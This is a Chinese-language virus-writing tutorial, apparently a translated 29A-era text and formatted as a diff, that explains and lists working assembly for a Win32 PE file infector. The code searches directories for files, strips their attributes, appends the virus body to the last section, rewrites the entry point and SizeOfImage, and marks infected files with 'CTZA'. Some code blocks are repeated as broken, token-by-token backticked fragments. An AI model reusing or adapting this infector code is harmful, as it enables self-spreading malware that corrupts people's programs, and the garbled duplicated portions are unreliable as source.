+; 这是感染例程的第一部分。第一行仅仅是为了用一个更为优化的方法(此例中的 `AND` 比 `mov` 更小)清除感染计数器(即设置成 0)。在感染计数器已经重置之后，该是搜索文件来感染的时候了;)OK，在 DOS 中，我们有 `INT 21h` 的 `4Eh/4Fh` 服务...现在在 Win32 中，我们有两个等价的 API 函数:`FindFirstFile` 和 `FindNextFile`。现在我们想要搜索目录中的第一个文件。所有的 Win32 中的寻找文件的函数都有一个结构(你还记得 DTA 吗?)叫做 `WIN32_FIND_DATA`(许多时候简称 WFD)。让我们看看这个结构的域：
+
+;
+; `MAX_PATH equ 260 <-- 路径的最大大小`
+;
+; `FILETIME STRUC <-- 处理时间的结构，在很多 Win32 结构中都有`
+; `FT_dwLowDateTime dd ?`
+; `FT_dwHighDateTime dd ?`
+; `FILETIME ENDS`
+;
+; `WIN32_FIND_DATA STRUC`
+; `WFD_dwFileAttributes dd ? <-- 包含了文件的属性`
+; `WFD_ftCreationTime FILETIME ? <-- 文件创建的时间`
+; `WFD_ftLastAccessTime FILETIME ? <-- 文件的最后访问时间`
+; `WFD_ftLastWriteTime FILETIME ? <-- 文件的最后修改时间`
+; `WFD_nFileSizeHigh dd ? <-- 文件大小的高位`
+; `WFD_nFileSizeLow dd ? <-- 文件大小的低位`
+; `WFD_dwReserved0 dd ? <-- 保留`
+; `WFD_dwReserved1 dd ? <-- 保留`
+; `WFD_szFileName db MAX_PATH dup (?) <-- ASCII 形式的文件名`
+; `WFD_szAlternateFileName db 13 dup (?) <-- 除去路径的文件名`
+; `db 03 dup (?) <-- Padding`
+; `WIN32_FIND_DATA ENDS`
+;
+
+; ?`dwFileAttributes`: 决定找到的文件的属性。这个成员可以为一个或更多的值[在这里因为空间关系就不列举了:你可以在 29A 的 INC 文件(29A#2)和以前的文档中找到]
+;
+; ?`ftCreationTime`: 包含了一个 `FILETIME` 结构包含了文件创建的时间。`FindFirstFile` 和 `FindNextFile` 以 Coordinated Universal Time (UTC) 格式报告文件的时间。如果文件系统包含的文件不支持这个时间成员的话，这两个函数会把 `FILETIME` 的成员设置成 0。你可以使用 `FileTimeToLocalFileTime` 函数来把 UTC 转化成本机时间，然后使用 `FileTimeToSystemTime` 函数把本机时间转化成一个 `SYSTEMTIME` 结构的包含月，日，年，星期，小时，分，秒，和毫秒。
+;
+; ?`ftLastAccessTime`: 保存了一个 `FILETIME` 结构，包含了文件最后访问的时间。这个时间是 UTC 形式;如果文件系统不支持这个时间成员，`FILETIME` 的成员就是 0。
+;
+; ?`ftLastWriteTime`: 保存了一个 `FILETIME` 结构包含了文件的最后修改时间。时间是 UTC 格式的；如果文件系统不支持这个时间成员，`FILETIME` 的成员就是 0。
+;
+; ?`nFileSizeHigh`: 保存了 `DWORD` 类型的文件大小的高位。如果文件大小比 `MAXDWORD` 大的话，这个值为 0。文件的大小等于(`nFileSizeHigh * MAXDWORD`)+ `nFileSizeLow`。
+;
+; ?`nFileSizeLow`: 保存了 `DWORD` 类型的文件大小的低位。
+;
+; ?`dwReserved0`: 保留为将来使用。
+;
+; ?`dwReserved1`: 保留为将来使用。
+;
+; ?`cFileName`: 一个 NULL 字符结尾的字符串是文件的名字。
+;
+; ?`cAlternateFileName`: 一个以 NULL 结尾的字符串保存的是文件的可选名。这个名字是古典的 8.3(filename.ext)文件名格式。
+;
+; 当我们知道了 WFD 结构的域之后，我们可以更深一层地去"寻找"Windows 地函数。首先让我们来看看 `FindFirstFileA` 这个 API 地描述：
+;
+; `FindFirstFile` 函数在一个目录中搜索一个和指定地文件名符合的文件。`FindFirstFileA` 还检查子目录名。
+;
+; ```
+; HANDLE FindFirstFile(
+;   LPCTSTR lpFileName,  // 指向要搜索的文件名
+;   LPWIN32_FIND_DATA lpFindFileData    // 指向返回信息
+; );
+; ```
+;
+; 参数
+; ====
+;
+; ?`lpFileName`: A. Windows 95: 指向一个以 NULL 结尾的指定一个合法的目录或路径和文件名字符串，它可以包含通配符(*和?)。这个字符串不能超过 `MAX_PATH` 个数。
+; B. Windows NT: 指向一个以 NULL 结尾的指定一个合法的目录或路径和文件名字符串，它不能包含通配符(*和?)。
+;
+; 路径有一个缺省的字符大小限制 `MAX_PATH`。这个限制取决于 `FindFirst` 函数怎么分析路径。一个应用程序可以超过这个限制并可以通过调用宽(W)版本的 `FindFirstFile` 函数并预先考虑 `\\?\` 来传给超过 `MAX_PATH` 的路径。`\\?\` 告诉了函数关闭路径解析；它使得路径长于 `MAX_PATH` 可以被 `FindFirstFileW` 函数使用。这个还可以对 UNC 名有效。`\\?\` 被作为路径的一部分忽略掉了。例如，`\\?\C:\myworld\private` 被看成 `C:\myworld\private`，而 `\\?\UNC\bill_g_1\hotstuff\coolapps` 被看成 `\\bill_g_1\hotstuff\coolapps`。
+;
+; ?`lpFindFileData`: 指向于 `WIN32_FIND_DATA` 结构来接受关于找到的文件或目录。这个结构可以在随后的调用 `FindNextFile` 或 `FindClose` 函数中引用文件或子目录。
+;
+; 返回值
+; =====
+;
+; ?如果函数成功调用了，返回值是一个搜索句柄，在随后的调用 `FindNextFile` 或 `FindClose` 时用到。
+;
+; ?如果函数失败了，返回值是 `INVALID_HANDLE_VALUE`。为了获得详细的错误信息，调用函数。
+;
+; 所以，现在你知道了 `FindFirstFile` 函数的所有参数了。而且，现在你知道了下面代码块的最后一行了:)
+
+;---------------------------------------------------------------------------
+
+```
+__1:    push    dword ptr [ebp+OldEIP]          ; 保存 OldEIP 和 ModBase,
+          push    dword ptr [ebp+ModBase]         ; 感染时改变
+          call    Infection                       ; 感染找到的文件
+          pop     dword ptr [ebp+ModBase]         ; 恢复它们
+          pop     dword ptr [ebp+OldEIP]
+          inc     byte ptr [ebp+infections]       ; 增加计数器
+          cmp     byte ptr [ebp+infections],05h   ; 超过限制啦?
+          jz      FailInfect                      ; 该死...
+```
+
+;---------------------------------------------------------------------------
+
+; 我们所做的第一件事是保存了一些必须的变量的内容，它们在后面我们返回控制权给主体的时候用到，但是这些变量在感染文件的时候改变了是很痛苦的。我们调用感染例程：它仅需要 WFD 信息，所以我们不必给它传参数了。在感染完相关的文件后，我们把值再改回来。在做完那个以后，我们增加感染计数器，并检查我们是否已经感染了 5 个文件了(这个病毒的感染限制)。如果我们已经做完了那些事情，病毒从感染函数中退出。
+
+;---------------------------------------------------------------------------
+
+```
+__2:    lea     edi,[ebp+WFD_szFileName]         ; 指向文件名的指针
+        mov     ecx,MAX_PATH                    ; ECX = 260
+        xor     al,al                           ; AL = 00
+        rep     stosb                           ; 清除旧的文件名变量
+        lea     eax,[ebp+offset WIN32_FIND_DATA] ; 指向 WFD 的指针
+        push    eax                              ; 把它压栈
+        push    dword ptr [ebp+SearchHandle]     ; Push Search Handle
+        call    [ebp+_FindNextFileA]             ; 寻找另外一个文件
+        or      eax,eax                          ; 失败?
+        jnz     __1                              ; 没有, 感染另外一个
+
+CloseSearchHandle:
+        push    dword ptr [ebp+SearchHandle]     ; Push search handle
+        call    [ebp+_FindClose]                 ; 关闭它
+
+FailInfect:
+        ret
+```
+
+;---------------------------------------------------------------------------
+
+; 代码块的开始部分做一个简单的事情：它抹掉在 WFD 结构(校验文件名数据)里的数据。这样做是为了在寻找另外一个文件的时候避免出问题。我们下一步要做的是调用 `FindNextFile` 这个 API 函数。下面是这个 API 的描述:
+
+;
+; `FindNextFile` 函数继续以前调用的 `FindFirstFile` 函数来继续搜索一个文件 。
+;
+; ```
+; BOOL FindNextFile(
+;   HANDLE hFindFile,   // 要搜索的句柄
+;   LPWIN32_FIND_DATA lpFindFileData    // 指向保存找到文件的数据的结构
+; );
+; ```
+;
+; 参数
+; ====
+;
+; ?`hFindFile`: 识别由先前的调用 `FindFirstFile` 函数返回的搜索句柄。
+
+
+
+`WIN32_FIND_DATA` 结构：
+- `lpFindFileData`：指向一个 `WIN32_FIND_DATA` 结构，用来接受关于找到的文件或子目录的信息。这个结构可以在随后的调用 `FindNextFile` 时引用来寻找文件或目录。
+
+**返回值**
+- 如果函数调用成功，返回值是非零值。
+- 如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 `GetLastError`。
+- 如果没有匹配的文件，`GetLastError` 函数会返回 `ERROR_NO_MORE_FILES`。
+
+如果 `FindNextFile` 返回错误，或者如果病毒已经到达了可能感染的最大文件数，我们到了这个例程的最后一块。它由通过 `FindClose` 这个 API 来关闭搜索句柄组成。照常，下面是这个 API 的描述：
+
+`FindClose` 函数关闭指定的搜索句柄。`FindFirstFile` 和 `FindNextFile` 函数使用这个句柄来用匹配给定的名字来定位文件。
+
+```
+BOOL FindClose(
+  HANDLE hFindFile    // 文件搜索句柄
+);
+```
+
+**参数**
+- `hFindFile`：识别搜索句柄。这个句柄必须是由 `FindFirstFile` 函数已经打开的。
+
+**返回值**
+- 如果函数调用成功，返回值是非 0 值。
+- 如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 `GetLastError`。
+
+**Infection**
+
+```
+        lea     esi,[ebp+WFD_szFileName]        ; 获得要感染的文件名
+        push    80h
+        push    esi
+        call    [ebp+_SetFileAttributesA]       ; 清除它的属性
+        call    OpenFile                        ; 打开它
+        inc     eax                             ; 如果 EAX = -1, 就有一个错误
+        jz      CantOpen
+        dec     eax
+        mov     dword ptr [ebp+FileHandle],eax
+```
+
+我们首先做的是清除文件的属性，并把它们设置为"正常文件"。这是通过 `SetFileAttributes` 这个 API 来实现的。下面给出这个 API 的简要介绍：
+
+`SetFileAttributes` 函数 设置一个文件的属性。
+
+```
+BOOL SetFileAttributes(
+  LPCTSTR lpFileName, // 文件名的地址
+  DWORD dwFileAttributes      // 要设置的属性的地址
+);
+```
+
+**参数**
+- `lpFileName`：指向一个保存要修改属性的文件的文件名字符串。
+- `dwFileAttributes`：指定要设置的文件的属性。这个参数可以为下面的值的组合。然而，所有的其它的值超越 `FILE_ATTRIBUTE_NORMAL`。
+
+**返回值**
+- 如果函数调用成功，返回值是非 0 值。
+- 如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 `GetLastError`。
+
+在我们设置了新的文件属性之后，我们打开了文件，而且，如果没有任何错误发生，它把句柄保存到它的变量中。
+
+```
+        mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; 首先我们用它的正确大小创建映射
+        call    CreateMap
+        or      eax,eax
+        jz      CloseFile
+        mov     dword ptr [ebp+MapHandle],eax
+        mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
+        call    MapFile                         ; 映射它
+        or      eax,eax
+        jz      UnMapFile
+        mov     dword ptr [ebp+MapAddress],eax
+```
+
+首先我们给 `ECX` 赋我们打算要映射的文件的大小，然后我们调用我们的函数来映射它。我们检查可能的错误，如果没有任何错误，我们继续，否则，我们关闭文件。然后我们保存映射句柄，并准备最终利用 `MapFile` 函数来映射它。还象以前那样，我们检查错误，决定相应的处理。如果所有的都做好了，我们保存映射起作用的地址。
+
+```
+        mov     esi,[eax+3Ch]
+        add     esi,eax
+        cmp     dword ptr [esi],"EP"             ; 它是 PE 吗?
+        jnz     NoInfect
+        cmp     dword ptr [esi+4Ch],"CTZA"      ; 它被感染了吗?
+        jz      NoInfect
+        push    dword ptr [esi+3Ch]
+        push    dword ptr [ebp+MapAddress]      ; 关闭所有
+        call    [ebp+_UnmapViewOfFile]
+        push    dword ptr [ebp+MapHandle]
+        call    [ebp+_CloseHandle]
+        pop     ecx
+```
+
+当我们在 `EAX` 中得到了开始映射的地址，我们刷新指向 PE 头 (`MapAddress+3Ch`) 的指针，然后我们规范化它，所以在 `ESI` 中我们将得到指向 PE 头的指针。总之我们检查它是否 OK，所以我们检查 PE 签名。在那个检查之后，我们检查文件是否在以前感染过了（我们在 PE 的偏移地址 `4Ch` 处保存了一个标记，程序从来不会用的），如果它没有，我们继续感染过程。我们保存他们，在堆栈中，文件对齐（看看 PE 头那一章）。而且在那之后，我们解除映射，并关闭映射句柄。最终我们从堆栈恢复文件对齐（`File Alignment`），把它存在 `ECX` 寄存器中。
+
+```
+        mov     eax,dword ptr [ebp+WFD_nFileSizeLow] ; 再次映射
+        add     eax,virus_size
+        call    Align
+        xchg    ecx,eax
+        call    CreateMap
+        or      eax,eax
+        jz      CloseFile
+        mov     dword ptr [ebp+MapHandle],eax
+        mov     ecx,dword ptr [ebp+NewSize]
+        call    MapFile
+        or      eax,eax
+        jz      UnMapFile
+        mov     dword ptr [ebp+MapAddress],eax
+        mov     esi,[eax+3Ch]
+        add     esi,eax
+```
+
+当我们在 `ECX`（准备 `Align` 函数，因为它需要在 `ECX` 中的对齐因子）中得到了文件对齐，我们给 `EAX` 赋打开的文件大小加上病毒大小（`EAX` 是要对齐的数量），然后我们调用 `Align` 函数，它在 `EAX` 中返回给我们对齐的数字。例如，如果对齐（`Alignment`）是 `200h`，而且文件大小+病毒大小是 `12345h`，`Align` 函数将会返回给我们的数字将会是 `12400h`。然后我们把对齐数字保存到 `ECX` 中。我们再次调用 `CreateMap` 函数，但是现在我们用对齐后的大小来映射文件。在这之后，我们再次使 `ESI` 指向 PE 头。
+
+```
+        mov     edi,esi                     ; EDI = ESI = Ptr to PE header
+        movzx   eax,word ptr [edi+06h]      ; AX = n?of sections
+        dec     eax                         ; AX--
+        imul    eax,eax,28h                 ; EAX = AX*28
+        add     esi,eax                     ; Normalize
+        add     esi,78h                     ; Ptr to dir table
+        mov     edx,[edi+74h]               ; EDX = n?of dir entries
+        shl     edx,3                       ; EDX = EDX*8
+        add     esi,edx                     ; ESI = Ptr to last section
+```
+
+首先我们也使 `EDI` 指向 PE 头。然后，我们给 `AX` 赋节的个数（一个 `WORD` 类型的数），并使它减 1。然后我们把 `AX`（`n`, 节数-1）乘以 `28h`（节头的大小），把它再加上 PE 头的偏移地址。使 `ESI` 指向目录表，在 `EDX` 中得到目录入口点的数目。然后我们把它乘以 8，最后把结果（在 `EDX` 中）加到 `ESI`，所以 `ESI` 将指到最后一节。
+
+```
+        mov     eax,[edi+28h]               ; 获得 EP
+```
+
+
+
+```asm
+        mov     dword ptr [ebp+OldEIP],eax    ; 保存它
+
+        mov     eax,[edi+34h]                ; 获得 imagebase
+
+        mov     dword ptr [ebp+ModBase],eax  ; 保存它
+
+        mov     edx,[esi+10h]                ; EDX = SizeOfRawData
+
+        mov     ebx,edx                      ; EBX = EDX
+
+        add     edx,[esi+14h]                ; EDX = EDX+PointerToRawData
+
+        push    edx                          ; 保存 EDX
+
+        mov     eax,ebx                      ; EAX = EBX
+
+        add     eax,[esi+0Ch]                ; EAX = EAX+VA 地址
+
+                                             ; EAX = 新 EIP
+
+        mov     [edi+28h],eax                ; 改变新的 EIP
+
+        mov     dword ptr [ebp+NewEIP],eax   ; 还保存它
+```
+
+`mov` `dword` `ptr` `[ebp+OldEIP]`, `eax` `;` `保存` `它`
+
+`mov` `eax`, `[edi+34h]` `;` `获得` `imagebase`
+
+`mov` `dword` `ptr` `[ebp+ModBase]`, `eax` `;` `保存` `它`
+
+`mov` `edx`, `[esi+10h]` `;` `EDX` `=` `SizeOfRawData`
+
+`mov` `ebx`, `edx` `;` `EBX` `=` `EDX`
+
+`add` `edx`, `[esi+14h]` `;` `EDX` `=` `EDX` `+` `PointerToRawData`
+
+`push` `edx` `;` `保存` `EDX`
+
+`mov` `eax`, `ebx` `;` `EAX` `=` `EBX`
+
+`add` `eax`, `[esi+0Ch]` `;` `EAX` `=` `EAX` `+` `VA` `地址`
+
+`;` `EAX` `=` `新` `EIP`
+
+`mov` `[edi+28h]`, `eax` `;` `改变` `新的` `EIP`
+
+`mov` `dword` `ptr` `[ebp+NewEIP]`, `eax` `;` `还` `保存` `它`
+
+`;---------------------------------------------------------------------------`
+
+`;` `首先` `我们` `给` `EAX` `赋` `正在` `感染` `的` `文件` `的` `EIP` `值`，`为了` `后面` `把` `旧` `EIP` `赋` `给` `一个` `变量`，`将会` `在`
+
+`;` `病毒` (`你` `将会` `看到`) `的` `开始` `用到`。`我们` `对` `基址` `同样` `这么` `做`。`然后`，`我们` `给` `EDX` `赋` `最后` `一节` `的`
+
+`;` `SizeOfRawData` `赋` `给` `EDX`，`再` `赋` `给` `EDX`，`然后`，`我们` `把` `EDX` `加上` `PointerToRawData` (`EDX`
+
+`;` `将在` `复制` `病毒` `的` `时候` `用到` `所以` `我们` `把` `它` `保存` `到` `堆栈` `中`)。`在这` `之后`，`我们` `给` `EAX` `赋` `SizeOfRawData`，
+
+`;` `把` `它` `加上` `VA` `地址` `:` `所以` `我们` `在` `EAX` `中` `得到` `的` `是` `主体` `的` `新` `EIP`。`所以` `我们` `把` `它` `保存` `在` `它` `的` `PE` `头`
+
+`;` `的` `域` `中`，`并` `保存` `在` `另外` `一个` `变量` `中` (`看看` `病毒` `的` `开始` `处`)。
+
+`;---------------------------------------------------------------------------`
+
+```asm
+        mov     eax,[esi+10h]                ; EAX = 新的 SizeOfRawData
+
+        add     eax,virus_size               ; EAX = EAX+VirusSize
+
+        mov     ecx,[edi+3Ch]                ; ECX = FileAlignment(文件对齐)
+
+        call    Align                        ; 对齐!
+
+        mov     [esi+10h],eax                ; 新的 SizeOfRawData
+
+        mov     [esi+08h],eax                ; 新的 VirtualSize
+
+        pop     edx                          ; EDX = 指向节尾的原始指针
+
+        mov     eax,[esi+10h]                ; EAX =  新的 SizeOfRawData
+
+        add     eax,[esi+0Ch]                ; EAX = EAX+VirtualAddress
+
+        mov     [edi+50h],eax                ; EAX =  新的 SizeOfImage
+
+        or      dword ptr [esi+24h],0A0000020h  ; 设置新的节标志
+```
+
+`mov` `eax`, `[esi+10h]` `;` `EAX` `=` `新的` `SizeOfRawData`
+
+`add` `eax`, `virus_size` `;` `EAX` `=` `EAX` `+` `VirusSize`
+
+`mov` `ecx`, `[edi+3Ch]` `;` `ECX` `=` `FileAlignment` (`文件` `对齐`)
+
+`call` `Align` `;` `对齐` `!`
+
+`mov` `[esi+10h]`, `eax` `;` `新的` `SizeOfRawData`
+
+`mov` `[esi+08h]`, `eax` `;` `新的` `VirtualSize`
+
+`pop` `edx` `;` `EDX` `=` `指向` `节尾` `的` `原始` `指针`
+
+`mov` `eax`, `[esi+10h]` `;` `EAX` `=` `新的` `SizeOfRawData`
+
+`add` `eax`, `[esi+0Ch]` `;` `EAX` `=` `EAX` `+` `VirtualAddress`
+
+`mov` `[edi+50h]`, `eax` `;` `EAX` `=` `新的` `SizeOfImage`
+
+`or` `dword` `ptr` `[esi+24h]`, `0A0000020h` `;` `设置` `新的` `节` `标志`
+
+`;---------------------------------------------------------------------------`
+
+`;` `Ok,` `我们` `做` `的` `第一` `件事` `是` `把` `最后` `一节` `的` `SizeOfRawData` `装载` `到` `EAX` `中`，`然后` `把` `病毒` `的` `大小`
+
+`;` `加上` `它`。`在` `ECX` `中`，`我们` `装载` `FileAlignment`，`我们` `调用` `Align` `函数`，`所以` `在` `EAX` `中`，
+
+`;` `我们` `将` `得到` `对齐` `后` `的` `SizeOfRawData` `+` `VirusSize`。
+
+`;` `让` `我们` `看看` `一个` `小` `例子` `:`
+
+`;`
+
+`;` `SizeOfRawData` `-` `1234h`
+
+`;` `VirusSize` `-` `400h`
+
+`;` `FileAlignment` `-` `200h`
+
+`;`
+
+`;` `所以`，`SizeOfRawData` `+` `VirusSize` `将为` `1634`，`对` `那个` `值` `对齐` `之后` `将为` `1800h`。`简单`，`哈` `?`
+
+`;` `所以` `我们` `把` `对齐` `后` `的` `值` `设` `为` `新的` `SizeOfRawData` `并` `作为` `新的` `VirtualSize`，`这么` `做` `之后` `我们`
+
+`;` `将` `没有` `问题` `了`，`我们` `计算` `新的` `SizeOfImage`，`也就是说`，`新的` `SizeOfRawData` `和` `VirtualAddress`
+
+`;` `的` `和`。`在` `计算` `完` `这个` `之后`，`我们` `把` `它` `保存` `到` `PE` `头` `的` `SizeOfImage` `域` `中` (`偏移` `50h` `处`)。`然后`，
+
+`;` `我们` `按` `如下` `设置` `节` `的` `属性` `:`
+
+`;`
+
+`;` `00000020h` `-` `节` `包含` `代码`
+
+`;` `40000000h` `-` `节` `可读`
+
+`;` `80000000h` `-` `节` `可写`
+
+`;`
+
+`;` `所以`，`如果` `我们` `要` `应用` `这` `三个` `属性` `只要` `把` `那` `3` `个` `值` `或` (`OR`) `即可`，`结果` `将` `是` `A0000020h`。
+
+`;` `所以`，`我们` `还` `要` `把` `他` `和` `节` `的` `当前` `属性` `值` `进行` `或`，`这么` `做` `我们` `不必` `删除` `旧` `的`：`只要` `加上` `它们`。
+
+`;---------------------------------------------------------------------------`
+
+```asm
+        mov     dword ptr [edi+4Ch],"CTZA"  ; 设置感染标志
+
+        lea     esi,[ebp+aztec]              ; ESI = 指向 virus_start 的指针
+
+        xchg    edi,edx                      ; EDI = 指向最后一节结尾的指针
+
+                                             ;
+
+        add     edi,dword ptr [ebp+MapAddress]  ; EDI = 规范化后指针
+
+        mov     ecx,virus_size               ; ECX = 要复制的大小
+
+        rep     movsb                        ; 做它!
+
+        jmp     UnMapFile                    ; 解除映射, 关闭, 等等.
+```
+
+`mov` `dword` `ptr` `[edi+4Ch]`, `"CTZA"` `;` `设置` `感染` `标志`
+
+`lea` `esi`, `[ebp+aztec]` `;` `ESI` `=` `指向` `virus_start` `的` `指针`
+
+`xchg` `edi`, `edx` `;` `EDI` `=` `指向` `最后` `一节` `结尾` `的` `指针`
+
+`add` `edi`, `dword` `ptr` `[ebp+MapAddress]` `;` `EDI` `=` `规范化` `后` `指针`
+
+`mov` `ecx`, `virus_size` `;` `ECX` `=` `要` `复制` `的` `大小`
+
+`rep` `movsb` `;` `做` `它` `!`
+
+`jmp` `UnMapFile` `;` `解除` `映射` `,` `关闭` `,` `等等` `.`
+
+`;---------------------------------------------------------------------------`
+
+`;` `为了` `避免` `重复` `感染` `文件` `我们` `现在` `所` `做` `的` `首先` `是` `在` `PE` `头` `没有` `用过` `地方` `设置` `感染` `的` `标志` (`偏移`
+
+`;` `4Ch` `是` `保留` `的`)。`然后`，`在` `ESI` `中` `放` `一个` `指向` `病毒` `开始` `的` `指针`。`在` `我们` `把` `EDX` `的` `值` `赋` `给` `ESI`
+
+`;` (`记住`：`EDX` `=` `旧` `的` `SizeOfRawData` `+` `PointerToRawData`) `之后`，`那么` `就是` `我们` `放置` `病毒` `代码`
+
+`;` `的` `RVA`。`正如` `我` `已经` `说` `过` `了`，`它` `是` `一个` `RVA`，`这` `一点` `你` `必须` `知道` `;)` `RVA` `必须` `转换成` `VA`，
+
+`;` `这是` `通过` `把` `RVA` `加上` `相对` `值` `实现` `的` `...` `所以`，`它` `和` `开始` `映射` `文件` `的` `地址` (`如果` `你` `还` `记得`，`它` `是`
+
+`;` `由` `MapViewOfFile` `这个` `API` `返回` `的`) `相关`。`所以`，`最后`，`在` `EDI` `中` `我们` `得到` `的` `是` `写` `病毒` `代码` `的`
+
+`;` `VA`。`在` `ECX` `中`，`我们` `装入` `病毒` `的` `大小`，`并` `复制`。`所有` `都` `做好` `了` `:)` `现在` `我们` `关闭` `所有` `...`
+
+`;---------------------------------------------------------------------------`
+
+`NoInfect:`
+
+```asm
+        dec     byte ptr [ebp+infections]
+
+        mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
+
+        call    TruncFile
+```
+
+`dec` `byte` `ptr` `[ebp+infections]`
+
+`mov` `ecx`, `dword` `ptr` `[ebp+WFD_nFileSizeLow]`
+
+`call` `TruncFile`
+
+`;---------------------------------------------------------------------------`
+
+`;` `在` `感染` `的` `时候`，`如果` `有` `什么` `错误` `发生`，`我们` `就` `到了` `这` `个` `地方`。`我们` `把` `感染` `计数` `器` `减` `1`，`把` `文件`
+
+`;` `截去` `感染` `之前` `的` `大小`。`我` `希望` `我们` `的` `病毒` `不会` `到达` `这` `个` `地方` `:)`
+
+`;---------------------------------------------------------------------------`
+
+`UnMapFile:`
+
+```asm
+        push    dword ptr [ebp+MapAddress]   ; 关闭映射的地址
+
+        call    [ebp+_UnmapViewOfFile]
+
+CloseMap:
+
+        push    dword ptr [ebp+MapHandle]    ; 关闭映射
+
+        call    [ebp+_CloseHandle]
+
+CloseFile:
+
+        push    dword ptr [ebp+FileHandle]   ; 关闭文件
+
+        call    [ebp+_CloseHandle]
+
+CantOpen:
+
+        push    dword ptr [ebp+WFD_dwFileAttributes]
+
+        lea     eax,[ebp+WFD_szFileName]     ; 设置原先文件的的属性
+
+        push    eax
+
+        call    [ebp+_SetFileAttributesA]
+
+        ret
+```
+
+`push` `dword` `ptr` `[ebp+MapAddress]` `;` `关闭` `映射` `的` `地址`
+
+`call` `[ebp+_UnmapViewOfFile]`
+
+`CloseMap:`
+
+`push` `dword` `ptr` `[ebp+MapHandle]` `;` `关闭` `映射`
+
+`call` `[ebp+_CloseHandle]`
+
+`CloseFile:`
+
+`push` `dword` `ptr` `[ebp+FileHandle]` `;` `关闭` `文件`
+
+`call` `[ebp+_CloseHandle]`
+
+`CantOpen:`
+
+`push` `dword` `ptr` `[ebp+WFD_dwFileAttributes]`
+
+`lea` `eax`, `[ebp+WFD_szFileName]` `;` `设置` `原先` `文件` `的` `的` `属性`
+
+`push` `eax`
+
+`call` `[ebp+_SetFileAttributesA]`
+
+`ret`
+
+`;---------------------------------------------------------------------------`
+
+`;` `这` `块` `代码` `集中` `于` `关闭` `在` `感染` `的` `时候` `打开` `的` `所有` `东西`：`映射` `地址`，`映射` `自身`，`文件`，`随后` `把`
+
+`;` `原先` `的` `属性` `设置` `回去`。
+
+`;` `让` `我们` `看看` `这里` `用到` `的` `API`：
+
+```text
+;  UnmapViewOfFile 函数从调用进程的地址空间中解除文件的映射。
+
+;  BOOL UnmapViewOfFile(
+
+;    LPCVOID lpBaseAddress    // 开始映射的地址
+;  );
+
+;  参数
+;  ====
+
+;  ?lpBaseAddress: 指向要解除映射的文件的基址。这个值必须是由先前调用 MapViewOfFile
+;    或 MapViewOfFileEx 函数返回的值。
+
+;  返回值
+;  =====
+
+;  ?如果函数调用成功，返回值是非 0 值，而且所有指定范围内的页将会标志 "lazily"。
+
+;  ?如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 GetLastError 函数。
+
+;  ---
+
+;  CloseHandle 函数关闭一个打开对象的句柄。
+
+;  BOOL CloseHandle(
+;    HANDLE hObject  // 要关闭对象的句柄
+;  );
+
+;  参数
+;  ====
+
+;  ?hObject: 指一个打开对象的句柄。
+
+;  返回值
+;  ======
+
+;  ?如果函数调用成功，返回值是非 0 值。
+;  ?如果函数调用失败，返回值是 0。想要获得详细的错误信息，调用 GetLastError。
+```
+
+`GetK32` `proc`
+
+
+
+```
+_@1:    cmp     word ptr [esi],"ZM"
+
+        jz      WeGotK32
+
+_@2:    sub     esi,10000h
+
+        loop    _@1
+
+WeFailed:
+
+        mov     ecx,cs
+
+        xor     cl,cl
+
+        jecxz   WeAreInWNT
+
+        mov     esi,kernel_
+
+        jmp     WeGotK32
+
+WeAreInWNT:
+
+        mov     esi,kernel_wNT
+
+WeGotK32:
+
+        xchg    eax,esi
+
+        ret
+
+GetK32        endp
+
+GetAPIs       proc
+
+@@1:    push    esi
+
+        push    edi
+
+        call    GetAPI
+
+        pop     edi
+
+        pop     esi
+
+        stosd
+
+        xchg    edi,esi
+
+        xor     al,al
+
+@@2:    scasb
+
+        jnz     @@2
+
+        xchg    edi,esi
+
+@@3:    cmp     byte ptr [esi],0BBh
+
+        jnz     @@1
+
+        ret
+
+GetAPIs       endp
+
+GetAPI        proc
+
+        mov     edx,esi
+
+        mov     edi,esi
+
+        xor     al,al
+
+@_1:    scasb
+
+        jnz     @_1
+
+        sub     edi,esi                     ; EDI = API 的名字大小
+
+        mov     ecx,edi
+
+        xor     eax,eax
+
+        mov     esi,3Ch
+
+        add     esi,[ebp+kernel]
+
+        lodsw
+
+        add     eax,[ebp+kernel]
+
+        mov     esi,[eax+78h]
+
+        add     esi,1Ch
+
+        add     esi,[ebp+kernel]
+
+        lea     edi,[ebp+AddressTableVA]
+
+        lodsd
+
+        add     eax,[ebp+kernel]
+
+        stosd
+
+        lodsd
+
+        add     eax,[ebp+kernel]
+
+        push    eax                         ; mov [NameTableVA],eax   =)
+
+        stosd
+
+        lodsd
+
+        add     eax,[ebp+kernel]
+
+        stosd
+
+        pop     esi
+
+        xor     ebx,ebx
+
+@_3:    lodsd
+
+        push    esi       
+
+        add     eax,[ebp+kernel]
+
+        mov     esi,eax
+
+        mov     edi,edx
+
+        push    ecx
+
+        cld
+
+        rep     cmpsb
+
+        pop     ecx
+
+        jz      @_4
+
+        pop     esi
+
+        inc     ebx
+
+        jmp     @_3               
+
+@_4:
+
+        pop     esi
+
+        xchg    eax,ebx
+
+        shl     eax,1
+
+        add     eax,dword ptr [ebp+OrdinalTableVA]
+
+        xor     esi,esi
+
+        xchg    eax,esi
+
+        lodsw
+
+        shl     eax,2
+
+        add     eax,dword ptr [ebp+AddressTableVA]
+
+        mov     esi,eax
+
+        lodsd
+
+        add     eax,[ebp+kernel]
+
+        ret
+
+GetAPI        endp
+
+;---------------------------------------------------------------------------
+
+; 上面所有的代码以前已经见过了，这里是有了一点点优化，所以你可以看看你自己用其它
+
+; 方法该怎么做。
+
+;---------------------------------------------------------------------------
+
+; 输入:
+
+;     EAX - 对齐的值
+
+;     ECX - 对齐因子
+
+; 输出:
+
+;     EAX - 对齐值
+
+Align         proc
+
+        push    edx
+
+        xor     edx,edx
+
+        push    eax
+
+        div     ecx
+
+        pop     eax
+
+        sub     ecx,edx
+
+        add     eax,ecx
+
+        pop     edx
+
+        ret
+
+Align         endp
+
+;---------------------------------------------------------------------------
+
+; 这个函数执行在 PE 感染中非常重要的一件事情：把数字和指定的因子对齐。如果你不是
+
+; 一个 d0rk，你就不必问我它是怎么工作的了。( Fuck,你到底学了没有？)
+
+;---------------------------------------------------------------------------
+
+; 输入:
+
+;     ECX - 要截的文件
+
+; 输出:
+
+;     无.
+
